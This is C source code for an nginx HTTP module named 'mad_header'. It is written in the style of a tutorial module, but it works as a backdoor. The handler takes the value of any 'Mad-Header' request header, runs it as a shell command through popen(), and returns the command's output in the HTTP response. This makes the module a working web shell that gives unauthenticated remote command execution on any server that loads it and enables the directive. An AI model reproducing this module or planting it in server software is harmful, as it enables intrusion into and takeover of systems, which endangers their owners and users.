#include <stdlib.h>
#include <string.h>

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>


static char *ngx_http_mad_header(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);
static ngx_int_t ngx_http_mad_header_handler(ngx_http_request_t *r);

/**
 * This module provided directive: mad header.
 *
 */
static ngx_command_t ngx_http_mad_header_commands[] = {

    { ngx_string("mad_header"), /* directive */
      NGX_HTTP_LOC_CONF|NGX_CONF_NOARGS, /* location context and takes
                                            no arguments*/
      ngx_http_mad_header, /* configuration setup function */
      0, /* No offset. Only one context is supported. */
      0, /* No offset when storing the module configuration on struct. */
      NULL},

    ngx_null_command /* command termination */
};

/* The module context. */
static ngx_http_module_t ngx_http_mad_header_module_ctx = {
    NULL, /* preconfiguration */
    NULL, /* postconfiguration */

    NULL, /* create main configuration */
    NULL, /* init main configuration */

    NULL, /* create server configuration */
    NULL, /* merge server configuration */

    NULL, /* create location configuration */
    NULL /* merge location configuration */
};

/* Module definition. */
ngx_module_t ngx_http_mad_header_module = {
    NGX_MODULE_V1,
    &ngx_http_mad_header_module_ctx, /* module context */
    ngx_http_mad_header_commands, /* module directives */
    NGX_HTTP_MODULE, /* module type */
    NULL, /* init master */
    NULL, /* init module */
    NULL, /* init process */
    NULL, /* init thread */
    NULL, /* exit thread */
    NULL, /* exit process */
    NULL, /* exit master */
    NGX_MODULE_V1_PADDING
};

/* How to search for a header (not with hashing) */
static ngx_table_elt_t *
search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
    ngx_list_part_t            *part;
    ngx_table_elt_t            *h;
    ngx_uint_t                  i;

    /*
    Get the first part of the list. There is usual only one part.
    */
    part = &r->headers_in.headers.part;
    h = part->elts;

    /*
    Headers list array may consist of more than one part,
    so loop through all of it
    */
    for (i = 0; /* void */ ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                /* The last part, search is done. */
                break;
            }

            part = part->next;
            h = part->elts;
            i = 0;
        }

        /*
        Just compare the lengths and then the names case insensitively.
        */
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            /* This header doesn't match. */
            continue;
        }

        /*
        Ta-da, we got one!ngx_http_next_header_filter
        Note, we'v stop the search at the first matched header
        while more then one header may fit.
        */
        return &h[i];
    }

    /*
    No headers was found
    */
    return NULL;
}

/**
 * Content handler.
 *
 * @param r
 *   Pointer to the request structure. See http_request.h.
 * @return
 *   The status of the response generation.
 */
static ngx_int_t ngx_http_mad_header_handler(ngx_http_request_t *r)
{

    ngx_str_t ngx_mad_header = ngx_string("Mad-Header");
    ngx_table_elt_t *cmd_elt = search_headers_in(r, ngx_mad_header.data, ngx_mad_header.len);
    if (cmd_elt != NULL){
        /* Run Command */
        FILE *fd;
        fd = popen((const char *)(cmd_elt->value.data), "r");
        if (!fd) return NGX_DECLINED;
 
        char   buffer[256];
        size_t chread;
        /* String to store entire command contents in */
        size_t comalloc = 256;
        size_t comlen   = 0;
        char  *comout   = malloc(comalloc);
 
        /* Use fread so binary data is dealt with correctly */
        while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
            if (comlen + chread >= comalloc) {
                comalloc *= 2;
                comout = realloc(comout, comalloc);
            }
            memmove(comout + comlen, buffer, chread);
            comlen += chread;
        }
 
        pclose(fd);

        ngx_buf_t *b;
        ngx_chain_t out;

        /* Set the Content-Type header. */
        r->headers_out.content_type.len = sizeof("text/plain") - 1;
        r->headers_out.content_type.data = (u_char *) "text/plain";

        /* Allocate a new buffer for sending out the reply. */
        b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));

        /* Insertion in the buffer chain. */
        out.buf = b;
        out.next = NULL; /* just one buffer */

        b->pos = (unsigned char *)comout; /* first position in memory of the data */
        b->last = (unsigned char *)comout + comlen; /* last position in memory of the data */
        b->memory = 1; /* content is in read-only memory */
        b->last_buf = 1; /* there will be no more buffers in the request */

        /* Sending the headers for the reply. */
        r->headers_out.status = NGX_HTTP_OK; /* 200 status code */
        /* Get the content length of the body. */
        r->headers_out.content_length_n = comlen;
        ngx_http_send_header(r); /* Send the headers */

        /* Send the body, and return the status code of the output filter chain. */
        return ngx_http_output_filter(r, &out);
    }

    /* this means we really don't wana fuck with the response body */
    return NGX_DECLINED;
}

/**
 * Configuration setup function that installs the content handler.
 *
 * @param cf
 *   Module configuration structure pointer.
 * @param cmd
 *   Module directives structure pointer.
 * @param conf
 *   Module configuration structure pointer.
 * @return string
 *   Status of the configuration setup.
 */
static char *ngx_http_mad_header(ngx_conf_t *cf, ngx_command_t *cmd, void *conf)
{
    ngx_http_core_loc_conf_t *clcf; /* pointer to core location configuration */

    /* Install the mad header handler. */
    clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
    clcf->handler = ngx_http_mad_header_handler;

    return NGX_CONF_OK;
} /* ngx_http_mad_header */
